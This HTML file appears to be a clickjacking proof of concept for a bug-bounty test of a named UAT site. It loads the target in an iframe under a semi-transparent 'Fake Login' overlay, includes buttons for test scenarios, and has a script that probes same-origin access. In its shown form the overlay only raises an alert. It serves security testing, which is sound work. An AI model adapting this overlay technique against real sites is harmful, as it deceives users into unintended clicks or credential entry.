<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test - https://uat-bugbounty.nonprod.syfe.com</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .iframe-container { position: relative; width: 100%; height: 600px; border: 2px solid red; }
        iframe { width: 100%; height: 100%; border: none; }
        .overlay { 
            position: absolute; 
            top: 50px; 
            left: 50px; 
            background: rgba(255, 0, 0, 0.7); 
            color: white; 
            padding: 20px;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <h1>Clickjacking Test Page</h1>
    <p>Target: <code>https://uat-bugbounty.nonprod.syfe.com</code></p>
    <p>Allowed in iframe by: <code>'self' https://*.webflow.com http://*.webflow.com http://*.webflow.io http://webflow.com https://webflow.com</code></p>
    
    <div class="iframe-container">
        <!-- Test iframe -->
        <iframe src="https://uat-bugbounty.nonprod.syfe.com" id="testFrame"></iframe>
        
        <!-- Overlay elementi (clickjacking simülasyonu) -->
        <div class="overlay" onclick="alert('Overlay clicked!')">
            <h2>FAKE BUTTON</h2>
            <p>Click me! (This is over the iframe)</p>
            <button>Fake Login</button>
        </div>
    </div>
    
    <div style="margin-top: 30px;">
        <h3>Test Senaryoları:</h3>
        <button onclick="document.getElementById('testFrame').src='https://uat-bugbounty.nonprod.syfe.com'">1. Normal Yükle</button>
        <button onclick="document.getElementById('testFrame').src='https://uat-bugbounty.nonprod.syfe.com?test=clickjack'">2. Parametre ile</button>
        <button onclick="document.querySelector('.overlay').style.opacity='0.3'">3. Overlay Şeffaflaştır</button>
    </div>
    
    <script>
        // Iframe yüklendiğinde kontrol et
        document.getElementById('testFrame').onload = function() {
            console.log('Iframe loaded');
            try {
                // İçeriğe erişmeye çalış (Same-Origin Policy engeller)
                console.log('Iframe location:', this.contentWindow.location.href);
            } catch (e) {
                console.log('Same-Origin Policy blocked:', e.message);
            }
        };
    </script>
</body>
</html>
